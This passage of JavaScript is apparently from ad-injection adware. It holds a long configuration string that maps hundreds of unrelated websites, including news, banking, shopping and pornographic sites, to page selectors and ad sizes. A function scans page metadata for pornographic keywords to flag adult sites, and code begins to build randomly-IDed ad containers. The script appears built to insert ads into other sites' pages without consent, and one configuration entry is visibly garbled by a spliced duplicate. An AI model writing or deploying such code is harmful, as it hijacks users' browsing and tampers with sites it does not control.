main-content"]*200**talktv.vn*div[class^="section-news top-news-block"]*200**kienthuc.net.vn*div[class^="feature clearfix parentbox"]*90**bongdaso.com*div[id^="firstbox"]*200**123doc.org*div[id^="dtm"]*200**www.baoventd.com*div[class^="box_news_hot"]*200**truykich.vn*div[class^="left"]*250**www.foody.vn*div[class^="content-container"]*250**healthplus.vn*div[class^="module-cnt pkg"]*250**www.bongda.com.vn*div[class^="breadcump"]*250**vlxx.tv*div[id^="video"]*250**nld.com.vn*div[class^="contenttotal"]*250**pose.com.vn*div[id^="bottomTiles"]*200**video.vitalk.vn*.related-with-list*600**vitalk.vn*div[id^="recentNews"]*200**download.com.vn*div[id^="page"]*200**www.sendo.vn*div[id^="recommend-women"]*250**cafef.vn*div[class^="top_noibat_row2"]*250**anime47.com*div[class^="last-film-box-wrapper"]*200**chimsedinang.com*.video-yeuthich*200**www.thuocbietduoc.com.vn*div[id^="neo-container"]*90**sinhvienit.net*div[id^="homecategory"]*400**congan.com.vn*div[id^="owl-articles"]*200**www.docxem.com*div[class^="entry_content"]*250**vothuat.vn*div[class^="entry-content"]*250**www.careerlink.vn*div[class^="job-side-data"]*400**www.careerlink.vn*div[class^="list-group list"]*200**vatgia.com*div[id^="vatgia_home_v4"]*90**www.thegioididong.com*div[class^="box_content"]*250**www.thegioididong.com*ul[class^="homeproduct"]*90**www.388bet.com*div[class^="step-3 container"]*90**phim14.net*div[id^="content"]*90**blogtamsu.vn*div[class^="bnlwl-special-wrapper"]*200**360game.vn*div[id^="new-game"]*200**www.nhaccuatui.com*div[class^="list_album"]*200**xehoiviet.com*div[class^="medium-7 columns"]*200**nhadatso.com*div[class^="bds_list"]*200**us.24h.com.vn*div[class^="padTB5 padR5"]*250**news.zing.vn*section[class^="main"]*250**news.zing.vn*section[id^="nhip-song"]*250**news.zing.vn*section[id^="song-tre"]*250**news.zing.vn*section[id^="the-thao"]*250**www.anime-th.com*.td-pb-span8*250**www.rakjung.com*div[class^="col-md-9"]*250**uouso.com*div[class^="col-sm-8 main-content"]*250**getgameth.com*div[id^="main-content"]*250**myreadyweb.com*div[id^="content"]*200**www.nice3anime.com*div[id^="themepacific_infinite"]*200**pattayaone.news*.td-pb-span8*200**www.mygame.in.th*div[id^="tabs-1"]*250**cherry-porn.com*div[id^="content"]*250**smailehi.com*div[id^="content"]*250**www.lovenayou.com*div[class^="tt_left grid"]*250**www.bigc.co.th*div[class^="home-layout-banners"]*250**www.kidjarak.com*div[class^="td-main-content-wrap"]*90**spiceee.net*div[class^="main-area main-area_home"]*200**www.doctor.or.th*div[class^="attachment attachment-after"]*250**thumbsup.in.th*div[class^="featured-articles"]*250**dujav.com*div[class^="peliculas"]*250**www.cookiecoffee.com*div[id^="content"]*250**casino1988.net*div[id^="new-index-text"]*200**www.naibann.com*div[class^="td-main-content-wrap"]*90**www.kfc.co.th*div[class^="row promo"]*250**www.khaosodenglish.com*.td-pb-span8*200**www.pornthanks.com*div[align^="center"]*200**www.horoworld.com*div[class^="inner _self-ph10-mt10"]*200**www.egat.co.th*div[id^="content-top"]*200**okmovie-hd.com*div[class^="leftC"]*200**youpornxxxx.com*div[id^="suggestions"]*250**www.share-si.com*div[class^="container sp_sidebar"]*250**teaso.ru*div[class^="bitad"]*250**ok-like.net*div[id^="content"]*250**gameoverth.com*div[id^="diy1"]*250**hd.xxxunlockporn.com*div[id^="content"]*250**tsgclub.net*div[id^="rd_module_blog"]*250**www.thaihealth.or.th*div[class^="w_tab"]*250**positioningmag.com*div[id^="td_uid_47"]*250**www.one3up.com*div[id^="content"]*250**www.aripfan.com*.td-pb-span8*250*porn.newsexclub.com*div[id^="content"]*250**www2.thaiadmin.org*div[id^="boardindex_table"]*250**www.iphone-droid.net*div[class^="td_block_wrap td_block_14"]*250**ballnaja.com*div[class^="center"]*200**www.trekkingthai.com*div[class^="col-8 main-content"]*200**goosiam.com*div[class^="col-md-12 hidden-xs hidden-sm"]*200**curse-hell.net*div[class^="wp cl w"]*90**www.037hd.tv*div[class^="leftC"]*250**www.isranews.org*section[id^="tm-top-a"]*250**adult.porn919.com*div[class^="entry-header cf"]*200**adult.porn919.com*div[class^="loop-content-m"]*200**www.ufocool.com*div[class^="jumbotron"]*90**www.gmthai.com*div[class^="home-game-pc J_lazy_bg"]*250**www.balltrue.com*div[id^="main-content"]*250**www.hallyukstar.com*div[class^="theiaStickySidebar"]*600**www.lyrics.im*div[id^="banner"]*250**www.thscore.cc*div[class^="hotTags"]*200**cia4opm.com*footer[id^="footer"]*250**cia4opm.com*div[id^="content"]*250**on.tubexxxonly.com*div[id^="content"]*250**palungjit.org*div[class^="mainContent"]*250**www.clipfasthd.com*div[id^="main-content"]*200**bangkok.craigslist.co.th*div[id^="center"]*200**www.winner.co.th*div[id^="foot"]*250**www.f0nt.com*div[id^="bottom"]*250**th.xxxnung.com*div[id^="content"]*250**clipsumo.com*div[id^="content"]*200**www.chilindo.com*div[class^="left_col"]*200**www.cmart.co.th*.slider-style1*200**www.myhora.com*div[class^="content_right"]*200**lionairthai.com*div[id^="mainTabs"]*200**techxcite.com*div[id^="cate-bar"]*200**108lakorn.com*div[id^="container"]*200**www.thaifriendly.com*div[class^="tab-content"]*250**v2.allurexxxclub.com*footer[id^="footer"]*250**v2.allurexxxclub.com*div[class^="nag cf"]*200**www.easypacelearning.com*div[class^="left_column"]*600**www.wtfintheworld.com*div[class^="td-ss-main-content"]*250**www.khonkaenlink.info*div[class^="table-responsive"]*200**bangkokair.com*div[class^="bg-cross"]*90**www.meekhao.com*main[id^="content"]*200**naewna.com*div[class^="hotnews linklist pagebutton"]*200**fifaaddict.com*div[id^="tvLatestFrontpage"]*200**www.smmsport.com*section[class^="latest-article-section"]*250**www.lakornhit.com*div[class^="col-left"]*200**www.metalbridges.com*div[id^="main"]*250**avcollectors.com*div[id^="ja-content"]*250**happyluketh.com*div[class^="inner cover"]*250**www.siamdrama.com*div[id^="sidebar"]*600**bectero.com*div[class^="row are"]*250**rabbit.co.th*section[class^="row tab-news-feed"]*250**xxxnaja.com*div[class^="main-content"]*250**www.polleidesignworks.com*div[class^="loop-nav pag-nav"]*250**www.yahmovie.com*div[id^="primary-home"]*250**www.one2car.com*div[class^="cycle--control-circle"]*200**www.series24hr.com*div[class^="lateral"]*600**kod-hd.com*div[class^="leftC"]*200**medthai.com*div[class^="slick-list draggable"]*200**www.macthai.com*div[id^="content"]*250**www.vojkud.com*div[class^="peliculas"]*250**icwutudidare.info*div[id^="images"]*250**www.thaijobsgov.com*div[id^="left-sidebar"]*90**www.bangkokbiznews.com*div[class^="section_6 photo_gallery"]*200**rock-anime.com*div[class^="panel-body"]*90**miko-anime.com*div[class^="panel-body"]*90**www.clipmass.com*div[class^="staff-picked"]*200**xxxpostpic.org*div[class^="block980 whitebg"]*250**www.edtguide.com*div[class^="mask-col"]*200**www.toonclub-th.co*div[class^="panel panel-info"]*250**www.kaazip.com*div[class^="td-ss-main-content"]*250**www.expedia.co.th*div[id^="promo-deals-module"]*250**www.orztoon.co*div[class^="box_item"]*200**m.kku.ac.th*div[class^="ui-content"]*90**mx7.com*div[id^="content-section"]*90**www.series-onlines.com*div[class^="leftC"]*250**www.tunwalai.com*div[id^="main-content-news-update"]*250**www.ko-anime.com*section[class^="tt-l tt-full sec_ct"]*200**www.onlinethailand.net*div[class^="contact-left"]*200**www.kanomjeeb.com*div[class^="article no-padding"]*90**www.bestmovie-hd.com*div[class^="filmcontent"]*200**www.nokair.com*div[id^="dialog-message"]*250**www.yellowpages.co.th*div[class^="col-md-12 col-xs-12 homepage-last"]*250**adultok.xclubporn.com*div[id^="content"]*250**xclubporn.com*footer[id^="footer"]*250**www.jib.co.th*div[class^="panelwidget"]*250**www.scb.co.th*div[id^="container-main"]*90**www.moph.go.th*div[class^="row box-main-1"]*90**taladrod.com*div[id^="body_container"]*200**www.thaiseoboard.com*div[id^="mainbody-padding"]*200**www.chillpainai.com*div[class^="row image-box style1"]*200**www.ddproperty.com*section[class^="secondary-sticky-bar"]*90**www.9nung.com*section[id^="content"]*200**www.jeban.com*div[class^="activities-wrapper"]*250**www.cmu.ac.th*div[id^="tabs-1"]*90**www.pantipmarket.com*div[id^="pmk_search_bar_box"]*250**www.watchlakorn.in*div[class^="section_left"]*90**www.sayhibeauty.com*aside[id^="randompostwidget-2"]*600**www.tvpoolonline.com*div[class^="article"]*200**sistacafe.com*div[id^="home"]*90**sistacafe.com*div[id^="rightside"]*600**www.siamphone.com*div[id^="phone_review"]*250**www.box-manga.com*div[class^="panel panel-info"]*250**ent.jarm.com*div[class^="row news-bottom3"]*400**www.gangzabaaball.com*div[class^="page-header page-header-1"]*250**www.gangzabaaball.com*section[name^="news-hot-today"]*90**ch7.com*div[class^="drama_box "]*200**liekr.com*div[class^="left box"]*250**www.siamzone.com*.uk-margin-top-remove*200**www.chula.ac.th*div[id^="section-news"]*200**www.wongnai.com*div[class^="search-result row"]*200**www.dedbit.com*td[class^="news"]*200**www.exness.com*div[class^="main-content"]*90**www.komchadluek.net*div[id^="rowbox-news"]*200**www.majorcineplex.com*div[class^="listblogMovies"]*200**kaijeaw.com*div[id^="left-sidebar"]*250**www.warpfootball.com*div[class^="col-sm-4"]*600**postto.me*div[class^="row content-row"]*90**www.genfb.com*div[id^="sidebar"]*600**www.prachachat.net*div[class^="vc_row td_uid_13"]*250**pokezz.com*div[class^="col s12 m9 l10"]*250**www.blognone.com*div[id^="block-system-main"]*250**www.ku.ac.th*div[class^="gtt-block-free free-box"]*90**natnaree22.exteen.com*#sidebar*600**ratemyserver.net*div[class^="contentwrap"]*200**www.set.or.th*div[class^="col-md-12 padding-0"]*90**www.posttoday.com*div[id^="newsclear"]*250**www.posttoday.com*div[id^="newsclear"]*250**www.spokedark.tv*div[class^="vc_row wpb_row td-pb-row td-ss-row"]*250**www.igdara.in.th*div[class^="infoMain"]*250**petmaya.com*div[class^="vc_column-inner"]*250**www.tarad.com*div[id^="product-detail"]*250**www.tarad.com*div[class^="headline_box"]*250**mahidol.ac.th*section[id^="middle"]*90**www.oremanga.com*div[class^="ore-manga-update-zone"]*200**store.ais.co.th*div[class^="category-products"]*250**www.priceza.com*div[id^="home-specials"]*90**www.pokerstars.com*div[class^="highlight-grid bgStyle12"]*90**www.pokerstars.com*div[class^="promo-grid-legacy bgStyle1"]*200**www.thaiairways.com*div[class^="ls-row mainpage"]*250**www.thaiairways.com*div[id^="ls-gen15663675-ls-col-body"]*250**www.thaiairways.com*div[class^="ls-row row-fluid newsandhl"]*90**dailynews.co.th*section[id^="highlight-section"]*250**oknation.nationtv.tv*div[id^="center_column_data"]*250**oknation.nationtv.tv*div[id^="set2"]*90**www.moviehd-free.com*div[class^="filmborder"]*200**thaivisa.com*div[class^="clearfix add_marg_top"]*90**postjung.com*div[id^="maincontent"]*200**portal.weloveshopping.com*div[class^="lvd-shop-info"]*90**portal.weloveshopping.com*div[class^="h-dealzapp-box"]*250**www.soccersuck.com*div[class^="post_panel_td post_panel_td_right"]*250**www.trueinternet.co.th*div[class^="col-sm-9"]*90**www.trueinternet.co.th*div[class^="section section-gray"]*90**www.clips4sale.com*div[id^="randomCat"]*200**www.nudevista.com*div[id^="listing"]*200**www.cam4.com*div[id^="main-content"]*200**www.porn.com*div[id^="player"]*200**www.flirt4free.com*div[id^="live_models"]*200**chaturbate.com*div[id^="defchat"]*200**chaturbate.com*div[class^="c-1 endless_page_template"]*200**tour.naughtyamerica.com*div[id^="white-wrapper"]*250**www.pornjam.com*div[class^="box-listados"]*250**adultinc.com*div[class^="video-list"]*250**jerkok.net*div[class^="panel panel-default"]*250**tubeq.xxx*div[class^="contents cf"]*250**porndope.com*div[class^="list-thumbs"]*250**neathdporn.com*ul[class^="thumbs-items"]*250**www.dirtydirtyangels.com*div[class^="tab-content"]*250**www.dirtydirtyangels.com*div[id^="content"]*250**blow-jobs.me*div[class^="cblow41363b3bff"]*250**www.xvicious.com*div[class^="inner-box-container"]*250**www.hotwettube.com*div[id^="player"]*250**www.faptube.com*div[class^="thumbs-hold"]*250**castingcouch-x.com*div[class^="jumbotron visible-lg"]*250**www.nudebeachpussy.com*div[id^="main-content"]*250**www.orgasm.com*div[class^="lvp-container-bg"]*250**wowgirls.tv*div[id^="main-content"]*250**www.puffynetwork.com*div[id^="video_container"]*250**www.pornblade.com*div[class^="videos cf"]*250**pornprosnetwork.com*div[id^="intro"]*250**bangbus.com*div[class^="player-out clearfix"]*250**www.vid2c.com*div[class^="thumbs"]*250**www.submityourflicks.com*main[class^="bg-mct3"]*250**www.pornworms.com*div[class^="tab-content"]*250**www.pornworms.com*div[id^="content"]*200**www.lesbian8.com*div[class^="tab-content"]*250**www.lesbian8.com*ul[class^="videos videosf"]*250**www.lesbianpornvideos.com*div[class^="thumb-list ac"]*250**fapdu.com*div[id^="upper-video"]*250**fapdu.com*div[id^="search-top"]*250**pornmaki.com*div[class^="video-page-wrap clearfix"]*250**www.madthumbs.com*div[id^="main"]*200**www.sexyhub.com*div[class^="paper-tiles latestScenes"]*250**crocotube.com*div[class^="smovies-list"]*250**www.daporn.com*div[class^="video-player started"]*250**www.daporn.com*div[class^="page-body listing-videos"]*250**fapxl.com*div[class^="span8"]*200**fapxl.com*div[id^="home-recent"]*250**www.hd-easyporn.com*section[class^="backg v_s"]*250**www.hd-easyporn.com*div[class^="videos cf"]*250**porn5.com*div[class^="c-1"]*250**porn5.com*ul[class^="list"]*250**www.tonightsgirlfriend.com*div[id^="content"]*250**freepornvs.com*div[id^="content"]*250**www.worldsex.com*div[class^="currently-videos"]*250**sex3.com*ul[class^="thumbs thumbs200"]*250**passion-hd.com*div[class^="jumbotron visible-lg"]*250**www.4sex4.com*div[class^="row videoThumbs"]*250**www.3movs.com*div[class^="player-holder"]*250**www.lobstertube.com*ul[class^="thumbs container"]*250**www.hardsextube.com*div[id^="video-interaction"]*250**www.hardsextube.com*div[class^="list-wrap scrollable"]*250**www.fux.com*div[id^="mainVideos"]*250**h2porn.com*div[class^="list-videos"]*250**pornharmony.com*div[id^="video_list"]*250**www.slutload.com*div[class^="playerNads clearfix"]*250**straight.aebn.net*div[id^="mainColumn"]*250**xbabe.com*div[class^="block_player"]*250**xbabe.com*div[class^="popular-thumbs"]*250**www.21sextury.com*div[id^="scenePlayer_player"]*250**www.21sextury.com*div[id^="HomeSceneListLanding"]*250**www.alotporn.com*div[class^="media-block"]*250**www.alotporn.com*div[id^="list_videos_being_watched"]*250**www.hd21.com*div[class^="category-list-wrap"]*250**www.twistys.com*div[class^="updates-container clearfix video"]*250**pornsharing.com*section[class^="layout"]*250**www.hotmovies.com*div[id^="new_release_scroller"]*250**www.fetishshrine.com*div[class^="block popular-videos"]*250**yourlust.com*div[class^="block_content"]*250**www.bangbrosnetwork.com*div[class^="contentarea h-top padLR"]*250**xxxbunker.com*div[id^="listItems"]*250**hellporno.com*div[class^="block-videos"]*250**www.tryboobs.com*.videos*250**www.mofosnetwork.com*div[class^="content-wrapper clearfix"]*250**www.blacked.com*div[id^="container"]*250**www.pornoxo.com*div[id^="maincolumn"]*250**www.flirt4free.com*div[id^="chat_interface"]*250**www.sunporno.com*div[class^="video"]*250**www.sunporno.com*div[id^="sliderCom"]*250**www.porntube.com*.box*250**www.cumlouder.com*div[class^="video-promos"]*250**www.cumlouder.com*div[id^="lst-scenes-cum"]*250**www.4tube.com*.box*250**www.empflix.com*section[id^="vidPlayer"]*250**tour.playboyplus.com*section[class^="latest-updates"]*250**www.spankwire.com*div[id^="main-area"]*250**shooshtime.com*div[class^="left primary"]*250**www.fuq.com*ul[class^="thumbs container"]*250**tour.naughtyamerica.com*div[class^="content-main homepage"]*250**anyporn.com*div[class^="block-video"]*250**www.eporner.com*div[id^="div-search-results"]*250**www.tnaflix.com*div[id^="hideAd"]*250**www.perfectgirls.net*div[class^="container overflow-none"]*250**pornxs.com*div[class^="top-content"]*250**porngale.com*div[class^="block-bg"]*250**www.hustler.com*div[id^="latest_updates_carousel"]*250**www.xtube.com*section[id^="mainSection"]*250**www.thumbzilla.com*div[id^="contentWrapper"]*250**www.hustler.com*div[id^="main"]*250**egbo.com*div[class^="main"]*250**www.xnxx.com*div[id^="content"]*250**www.bravotube.net*div[class^="headline"]*250**faapy.com*div[class^="thumbs video"]*250**www.youporn.com*div[class^="promo-message"]*250**www.hclips.com*div[class^="mfaapy.com*div[class^="thumbs video"]*250**www.youporn.com*div[class^="promo-message"]*250**www.hclips.com*div[class^="main"]*250**www.brazzersnetwork.com*div[id^="container"]*250**www.xvideos.com*div[id^="content"]*250**www.redtube.com*div[id^="contentHolder"]*250**www.pornhub.com*div[class^="container "]*250**www.vporn.com*div[id^="content"]*250**xhamster.com*div[class^="boxC"]*250**spankbang.com*main[id^="container"]*250**pornhd.com*section[id^="pageContent"]*250**www.porn.com*div[class^="main l170"]*250**porn555.com*div[class^="main_container"]*250**www.jofogas.hu*div[class^="listing-content row"]*250**www.origo.hu*div[class^="news-wrap wrap-42-25-33 normal"]*250**www.hotnews.ro*div[class^="center_side"]*250**www.filmeserialeonline.org*div[class^="peliculas"]*250**www.vice.com*div[class^="grid-row-container"]*250**www.gsp.ro*div[class^="sectiune calup-stiri utile"]*250**edu.ro*div[class^="home-content"]*250**www.digi24.ro*div[class^="row box"]*250**www.livejasmin.com*div[id^="listpage_container"]*250**bongacams.com*div[id^="mls_container"]*250**www.olx.ro*div[id^="offeractions"]*400**fishki.net*div[class^="list-view fishki-post-list pshift"]*250**fb.ru*div[id^="main"]*250**www.ozon.ru*div[class^="bUniversalShelf"]*250**4pda.ru*article[id^="rv4ATRnR4IL"]*200**lenta.ru*div[class^="span8 js-main__content"]*250**www.wildberries.ru*div[id^="part-1"]*250**www.yaplakal.com*div[id^="content-inner"]*200**ria.ru*div[id^="anchor_2"]*250**www.drive2.ru*div[class^="c-block c-block--content"]*250**pikabu.ru*div[class^="page-story"]*250**www.drom.ru*div[class^="b-links b-links_width-full"]*200**www.txxx.com*div[class^="right-section"]*250**9gag.com*div[class^="badge-entry-collection"]*250**www.wattpad.com*main[id^="authentication-panel"]*90**www.roblox.com*div[id^="SignUpFormContainer"]*300**www.metrodeal.com*div[class^="deal ph"]*250**www.metrodeal.com*div[class^="best-deals ph no-border"]*250**yts.ag*div[class^="home-movies"]*250**www.olx.ph*div[class^="categories"]*200**www.reddit.com*div[class^="trending-subreddits-content"]*250**www.slideshare.net*section[id^="hp-featured"]*250**deped.gov.ph*div[id^="content-wrapper"]*250**www.watchonlinemovies.com.pk*div[id^="singlecont"]*250**www.watchonlinemovies.com.pk*div[id^="maincont"]*250**hec.gov.pk*div[id^="homepage-container"]*90**www.fiverr.com*section[class^="categories js-categories-bar-reveal"]*250**www.dawnnews.tv*main[class^="ml-0  ml-sm-2  pb-2"]*250**thepiratebay.org*nav[id^="navlinks"]*250**www.bbc.com*div[id^="story-content"]*250**www.espncricinfo.com*section[class^="col-one"]*800**www.espncricinfo.com*section[class^="col-three"]*600**nts.org.pk*div[class^="container container2 clearfix"]*250**www.express.pk*div[class^="last columnarstorey"]*250**www.express.com.pk*div[id^="epaper"]*250**www.olx.com.pk*div[id^="rightMenu"]*250**www.olx.com.pk*div[class^="halfgrid main clr pdingbott20 zero-margin-top"]*200**www.dawn.com*section[class^="widget  theme  widget-linkedimage  text-center  p-0  widget--transparent  border--top"]*250**www.daraz.pk*div[class^="featured-brands"]*250**www.urdupoint.com*div[class^="main_bar fl"]*200**tuoitre.vn*div[class^="left-side"]*200**thegioinoithat.com*div[class^="td-ss-main-sidebar"]*600**www.blogphongthuy.com*div[id^="main"]*250**thegioinoithat.com*div[class^="vc_row wpb_row td-pb-row td-ss-row"]*250**guidegame.vn*div[class^="bordery"]*250**vietcombank.com.vn*div[id^="contents"]*250**vov.vn*div[id^="site-wrap"]*250**www.nguoiduatin.vn*div[class^="box-3-category box-category"]*250**trandaiquang.org*div[id^="inner"]*250**phimbathu.com*div[class^="right-content"]*250**phimbathu.com*div[class^="main-content"]*250**baodauthau.vn*div[class^="sidebar"]*400**tinhte.vn*div[id^="WidgetPageContents"]*250**www.blogger.com*div[id^="maia-main"]*250**bilutv.com*div[class^="most-view block"]*600**bilutv.com*div[id^="main-content"]*250**lazada.vn*section[class^="c-layout-container"]*200**mangvieclam.com*div[id^="page-contents"]*250**bloganchoi.com*div[class^="vc_row wpb_row td-pb-row td-ss-row"]*250**24h.com.vn*div[class^="colCenter"]*250**www.daikynguyenvn.com*section[id^="headline-post"]*250**adf.ly*div[id^="main"]*250**www.hao123.com*div[id^="hao123-bodyct"]*250**news.sanook.com*article[id^="contentPrint"]*250**www.sanook.com*section[class^="sizing-border sec-joox"]*250**lazada*div[class^="c-recommendation recommendation c-recommendation_js_inited c-recommendation_rendered"]*250**pantip.com*div[id^="comments-jsrender"]*250**pantip.com*div[class^="slide-news-wrap"]*250**www.snapdeal.com*div[class^="bx-viewport"]*250**fmovies.is*div[class^="widget latest-movies"]*250**www.manoramaonline.com*div[class^="main-frame mal_container"]*250**www.popads.net*div[class^="main_bottom"]*250**www.wittyfeed.com*div[class^="coverStoryDiv "]*250**en.savefrom.net*div[id^="tab1"]*250**paytm.com*div[class^="col-md-12 mr30"]*250**paytm.com*div[class^="Geht"]*250**www.icicibank.com*div[class^="offer-items-wrapper clearfix"]*250**www.jabong.com*div[class^="row content-product"]*250**www.jabong.com*section[id^="catalog-product"]*200**www.jabong.com*div[class^="desk-sis-wrapper clearfix"]*250**www.ndtv.com*div[class^="hmpage_lhs"]*250**companies.naukri.com*div[class^="bodyCont cl"]*250**www.naukri.com*div[class^="lmrWrap wrap"]*250**www.rediff.com*div[id^="leftcontainer"]*250**torrentz2.eu*div[class^="HalfRAcceptableAds"]*250**twitter.com*div[class^="MomentHomeModule"]*800**twitter.com*div[class^="SidebarCommonModules"]*800**www.quora.com*div[id^="__w2_F2L47y4_actionable"]*250**www.hdfcbank.com*div[class^="homebanner_wrapper"]*250**uidai.gov.in*div[id^="main-content"]*250**www.hotstar.com*div[class^="tray-container-outer"]*250**stackoverflow.com*div[class^="inner-content"]*250**www.linkedin.com*div[class^="profile-detail"]*250**www.linkedin.com*div[class^="neptune-grid three-column ghost-animate-in"]*250**www.flipkart.com*div[class^="_6TvkbM"]*250**www.onlinesbi.com*div[id^="banking"]*250**egov.kz*div[class^="region region-content"]*250**egov.kz*div[class^="content front-page-content"]*250**www.ivi.ru*div[class^="inner-nav-wrapper js-watch-inner-nav"]*250**www.ivi.ru*section[id^="userVideos"]*250**rutracker.org*div[id^="forums_wrap"]*250**vseigru.net*table[id^="all"]*200**www.parimatch.kz*div[id^="z_content"]*200**traffic-media.co*div[id^="content"]*250**hh.kz*div[class^="index-main-wrapper"]*250**baskino.co*div[class^="inside"]*250**baskino.co*div[id^="dle-content"]*250**satu.kz*div[class^="x-page__content x-page__content_padding_top"]*250**www.zakon.kz*article[id^="notsearch_area"]*250**kaspi.kz*section[id^="kaspiredSection"]*250**kaspi.kz*section[id^="startMainBanner"]*250**kinogo*div[class^="section"]*250**www.olx.kz*section[id^="body-container"]*250**www.nur.kz*div[class^="con rabota"]*250**www.bing.com*div[id^="recContainer"]*200**www.bing.com*div[id^="mmComponent_images_1"]*250**www.gazeta.ru*div[id^="ltop"]*250**coccoc.com*div[id^="control-slider"]*90**coccoc.com*div[class^="tv-query-list clear"]*300**www.tumblr.com*div[class^="dash_b_form_header"]*90**translate.google*div[id^="gt-src-p"]*60**translate.google*div[id^="gt-res-data"]*60**twitter.com*div[class^="Footer module roaming-module"]*800**www.twitch.tv*ul[class^="tabbed-split ember-view"]*250**www.twitch.tv*div[class^="fullwidth_main front_page"]*250**mail.ru*div[class^="wrapper"]*90**liga.net*div[class^="left_part"]*800**vtv.vn*div[class^="video_live clearfix"]*250**taimienphi.vn*div[class^="lstntop"]*250**vnexpress.net*div[class^="block_home_new"]*250**www.daikynguyenvn.com*div[class^="post-head"]*250**www.daikynguyenvn.com*div[class^="box-content headline-posts"]*250**www.webtretho.com*div[class^="postrow"]*300**www.webtretho.com*div[class^="ati_nwp_tieu_diem"]*250**www.catdumb.com*div[id^="td_uid_2"]*250**www.upyim.com*section[id^="home7"]*250**www.upyim.com*div[id^="sidebar_scoll_lock"]*600**tlcthai.com*div[id^="secondary"]*600**tlcthai.com*section[id^="drama"]*250**www.bangkokbank.com*div[id^="divRightContent"]*90**jarm.com*div[class^="layer-4"]*250**jarm.com*div[class^="layer-2"]*250**livehouse.in*div[class^="content grid-container"]*250**livehouse.in*div[class^="case-list"]*200**bloggang.com*div[id^="blog_detail"]*250**www.matichon.co.th*div[class^="td-container tdc-content-wrap"]*250**www.bing.com*div[id^="mainid"]*200**www.imdb.com*div[id^="main"]*300**www.imdb.com*div[id^="sidebar"]*600**mail.ru*div[class^="wrapper js-module"]*250**rutube.ru*div[class^="b-video__descr-wrapper"]*200**drom.ru*div[class^="b-right-side"]*800**drom.ru*div[class^="b-breadcrumbs"]*250**www.gismeteo.ru*div[class^="section__i"]*250**www.kinopoisk.ru*div[id^="content_block"]*200**www.kinopoisk.ru*div[id^="block_right"]*400**www.drive2.ru*div[class^="c-post__body js-gallery"]*250**craigslist*div[id^="center"]*240**craigslist*div[id^="leftbar"]*400**www.sahibinden.com*.special-categories*800**www.sahibinden.com*.classifiedDetailTitle*90**www.flipkart.com*div[class^="GQtpzo"]*250**www.flipkart.com*div[class^="_1fWl8W"]*600**www.rediff.com*div[id^="rightcontainer"]*800**www.rediff.com*div[class^="newrightcontainer"]*800**lazada*div[id^="prd-detail-page"]*250**lazada*div[class^="l-sidebar richRelevance__right"]*800**www.yallakora.com*div[class^="ArticleDetails"]*250**soundcloud.com*div[class^="badgeList m-twoRows lazyLoadingList"]*200**ask.fm*div[data-stick-to^=".sticky-anchor"]*600**www.youtube-mp3.org*#inner*250**imgur.com*div[class^="cards"]*200**www.walmart.com*div[class^="page-content-wrapper"]*250**www.nytimes.com*section[class^="inside-nyt"]*200**www.yelp.com*div[class^="clearfix layout-block layout-a"]*250**www.foxnews.com*section[id^="features-faces"]*250**www.booking.com*div[id^="basiclayout"]*250**www.booking.com*div[id^="basiclayout"]*250**onliner.by*div[class^="g-middle"]*250**worldoftanks*div[class^="promote-slider_holder"]*250**my-hit.org*div[class^="col-xs-12 center-block"]*300**www.olx.ua*section[id^="body-container"]*250**www.ukr.net*div[class^="szsumyljb"]*600**telegraf.com.ua*div[id^="mainWrapper"]*200**strana.ua*div[id^="main-right-column"]*600**znaj.ua*div[class^="top-menu-main"]*200**nv.ua*div[class^="right_column"]*600**from-ua.com*.no-left-margin*200**www.meteoprog.ua*div[class^="blockWeather"]*200**zakupka.com*div[id^="content"]*250**112.ua*div[class^="news-list"]*400**www.work.ua*div[class^="card card-indent"]*200**www.work.ua*.col-right*600**www.rbc.ua*aside[class^="sidebar-right"]*600**bigl.ua*div[id^="recommendations_products_list"]*200**rp5.ua*div[id^="extremeContent"]*200**en.vonvon.me*div[class^="list-block ng-scope"]*250**en.vonvon.me*div[class^="sidebar ng-scope"]*600**www.movie2free.com*div[class^="content-right"]*800**www.movie2free.com*div[class^="video-container"]*250**www.dek-d.com*div[id^="useful_section"]*250**www.newmovie-hd.com*div[class^="item-wrap clearfix"]*200**manager.co.th*div[class^=" sectionBox2"]*250**manager.co.th*div[id^="ais-sub-store"]*250**www.thairath.co.th*section[id^="headerContent"]*250**www.thairath.co.th*div[class^="row card fixtures"]*600**www.nungmovies-hd.com*div[class^="filmborder"]*200**www.nungmovies-hd.com*div[id^="sidebar"]*600**www.mobirum.com*div[id^="articleListArea"]*250**www.mobirum.com*section[id^="section_prereg_cafe"]*250**www.playpark.com*div[id^="pcgames"]*200**gordonua.com*div[id^="m_left"]*200**prom.ua*div[class^="x-page__content"]*250';
            var kys_2 = function () {
                var arr = [' porn,', ' porno ', ' porno,', ' porn ', 'pornhub', '.xxx ', ' bravotube ', ' xvideos ', ' xhamster ', ' any porn', ' порно ', ' adult video', ' คลิปโป๊AV ดูหนังxฟรี ', ' หนังโป๊ ', 'คลิปโป๊', ' khiêu dâm ', ' sex online,', ' sex hd,', ' phim sex ', ' phim sex,', 'xvideos.com,'];
                var mts = document.querySelectorAll('meta');
                var title = document.querySelector('title');
                var arr_mts = [];
                mts.forEach(function (peas) {
                    if (peas.getAttribute('name')) {
                        var nm = peas.getAttribute('name').toLowerCase();
                        if (nm === 'keywords' || nm === 'description') {
                            arr_mts.push(peas.getAttribute('content'));
                        }
                    }
                });
                if (title && title.parentNode.tagName === 'HEAD') {
                    arr_mts.push(title.innerText);
                }
                if (document.location.host) {
                    arr_mts.push(document.location.host);
                }
                var adu = 0;
                if (arr_mts.length > 0) {
                    arr_mts = arr_mts.join(',').toLowerCase();
                    arr.forEach(function (pp) {
                        if (arr_mts.indexOf(pp.toLowerCase()) !== -1) {
                            adu = 1;
                        }
                    });
                }
                if (adu === 0 && (host.indexOf('porn') > -1 || host.indexOf('shemale') > -1 || host === 'beeg.com')) {
                    adu = 1;
                }
                return adu;
            };
            var adult = kys_2();
            var createDiv_2 = function (width, height, fader_b, g_y, m_left) {
                var my_div = document.createElement("div");
                var randomId = Math.floor((Math.random() * 10000000000) + 1);
                my_div.setAttribute("id", randomId.toString());
                var ss = ['468x60', '728x90', '300x600', '300x250', '160x600', '600x300', '500x300', '250x250', '200x200', '200x150', '300x90', '240x80', '200x50', '300x400', '240x400', '200x800', '200x400', '240x300', '200x250', '970x250', '700x420', '750x300', '970x90', '180x150', '320x100', '234x60', '320x50', '125x125', '250x360', '120x600', '160x300', '120x240', '100x200', '336x280'];
                var ssIndex = width + 'x' + height;
                var ssSearch = ss.indexOf(ssIndex.toString());
                if (ssSearch > -1) {
                    ssIndex = ssSearch;
                }
